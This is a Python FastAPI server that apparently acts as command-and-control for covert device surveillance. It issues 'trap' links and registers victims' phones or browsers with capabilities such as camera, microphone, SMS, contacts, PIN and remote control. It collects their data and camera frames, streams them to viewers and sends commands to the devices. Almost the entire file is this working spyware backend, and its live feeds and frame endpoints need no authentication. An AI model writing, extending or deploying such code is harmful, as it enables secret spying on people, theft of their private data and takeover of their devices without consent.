import json, os, secrets, sqlite3, time, asyncio
from pathlib import Path
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Header, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse

ROOT = Path(__file__).parent
DATA = ROOT / "data"; DATA.mkdir(exist_ok=True); (DATA / "frames").mkdir(exist_ok=True)
API_TOKEN = os.environ["API_TOKEN"]
PUBLIC = os.environ["PUBLIC_URL"].rstrip("/")

app = FastAPI()
DEV: dict[str, WebSocket] = {}
VIEW: dict[str, set] = {}
LAST: dict[tuple, bytes] = {}
CAPS = {"android": ["loc","ip","screen","camf","camb","mic","contacts","sms","files","apps","pin","notif","control"],
        "ios": ["loc","ip","camf","camb","mic","contacts","photos","apps","replaykit"],
        "web": ["loc","ip","screen","camf","mic","clip"]}

def db():
    c = sqlite3.connect(DATA / "db.sqlite", check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

CON = db()
CON.executescript("""
create table if not exists devices(id text primary key, token text, platform text, model text,
  os text, ver text, caps text, ip text, last_seen real, created real);
create table if not exists events(id integer primary key autoincrement, dev text, kind text,
  payload text, ts real);
create table if not exists links(slug text primary key, dev text, created real);
""")
CON.commit()

def one(sql, args=()): return CON.execute(sql, args).fetchone()
def all_(sql, args=()): return CON.execute(sql, args).fetchall()
def run(sql, args=()): CON.execute(sql, args); CON.commit()

def auth(x_token: str | None):
    if x_token != API_TOKEN: raise HTTPException(401, "bad token")

@app.post("/api/link")
async def make_link(request: Request, x_token: str | None = Header(None)):
    auth(x_token)
    slug, dev = secrets.token_urlsafe(6), "web-" + secrets.token_hex(5)
    run("insert into links values(?,?,?)", (slug, dev, time.time()))
    run("insert into devices(id,token,platform,caps,created,last_seen) values(?,?,?,?,?,0)",
        (dev, secrets.token_hex(16), "web", ",".join(CAPS["web"]), time.time()))
    return {"slug": slug, "dev": dev, "url": f"{PUBLIC}/v/{slug}"}

@app.get("/v/{slug}", response_class=HTMLResponse)
async def trap(slug: str):
    row = one("select dev from links where slug=?", (slug,))
    if not row: raise HTTPException(404)
    return HTMLResponse((ROOT / "trap.html").read_text("utf-8").replace("__DEV__", row["dev"]))

@app.post("/api/link/{slug}/join")
async def join(slug: str, request: Request):
    row = one("select dev from links where slug=?", (slug,))
    if not row: raise HTTPException(404)
    tok = one("select token from devices where id=?", (row["dev"],))["token"]
    return {"dev": row["dev"], "token": tok}

@app.get("/live/{dev}", response_class=HTMLResponse)
async def live_page(dev: str):
    return HTMLResponse((ROOT / "live.html").read_text("utf-8").replace("__DEV__", dev))

@app.websocket("/ws/dev/{dev}")
async def dev_ws(ws: WebSocket, dev: str, token: str = ""):
    row = one("select * from devices where id=?", (dev,))
    if not row or row["token"] != token:
        await ws.close(); return
    await ws.accept()
    DEV[dev] = ws
    run("update devices set last_seen=?, ip=? where id=?", (time.time(), ws.client.host, dev))
    try:
        while True:
            m = await ws.receive()
            if m.get("bytes"):
                b = m["bytes"]; src, jpg = b[0], b[1:]
                LAST[(dev, src)] = jpg
                d = DATA / "frames" / dev; d.mkdir(exist_ok=True)
                (d / f"{src}.jpg").write_bytes(jpg)
                for v in list(VIEW.get(dev, ())):
                    try: await v.send_bytes(b)
                    except Exception: VIEW[dev].discard(v)
            elif m.get("text"):
                e = json.loads(m["text"]); t = e.get("t")
                if t == "hello":
                    p = e.get("platform", "web")
                    run("update devices set platform=?, model=?, os=?, ver=?, caps=? where id=?",
                        (p, e.get("model", "?"), e.get("os", "?"), e.get("ver", "?"),
                         ",".join(e.get("caps") or CAPS.get(p, [])), dev))
                elif t == "data":
                    run("insert into events(dev,kind,payload,ts) values(?,?,?,?)",
                        (dev, e.get("kind"), json.dumps(e.get("payload"), ensure_ascii=False), time.time()))
    except WebSocketDisconnect:
        pass
    finally:
        DEV.pop(dev, None)

@app.websocket("/ws/live/{dev}")
async def live_ws(ws: WebSocket, dev: str):
    await ws.accept()
    VIEW.setdefault(dev, set()).add(ws)
    for src in (0, 1, 2):
        if (dev, src) in LAST:
            try: await ws.send_bytes(bytes([src]) + LAST[(dev, src)])
            except Exception: pass
    try:
        while True: await ws.receive_text()
    except WebSocketDisconnect:
        VIEW[dev].discard(ws)

@app.post("/api/cmd/{dev}")
async def cmd(dev: str, body: dict, x_token: str | None = Header(None)):
    auth(x_token)
    ws = DEV.get(dev)
    if not ws: return {"ok": False, "err": "offline"}
    await ws.send_text(json.dumps({"t": "cmd", "id": secrets.token_hex(4), **body}))
    return {"ok": True}

@app.get("/api/devices")
def devices(x_token: str | None = Header(None)):
    auth(x_token)
    out = []
    for r in all_("select * from devices order by last_seen desc"):
        out.append({"id": r["id"], "platform": r["platform"], "model": r["model"], "os": r["os"],
                    "caps": (r["caps"] or "").split(","), "ip": r["ip"],
                    "age": int(time.time() - (r["last_seen"] or 0)), "online": r["id"] in DEV})
    return out

@app.get("/api/events")
def events(since: float = 0, dev: str = "", x_token: str | None = Header(None)):
    auth(x_token)
    sql = "select * from events where ts>?"; args = [since]
    if dev: sql += " and dev=?"; args.append(dev)
    return [dict(r) for r in all_(sql + " order by ts limit 200", args)]

@app.get("/api/frame/{dev}/{src}.jpg")
def frame(dev: str, src: int):
    p = DATA / "frames" / dev / f"{src}.jpg"
    return FileResponse(p) if p.exists() else JSONResponse({"err": "none"}, 404)
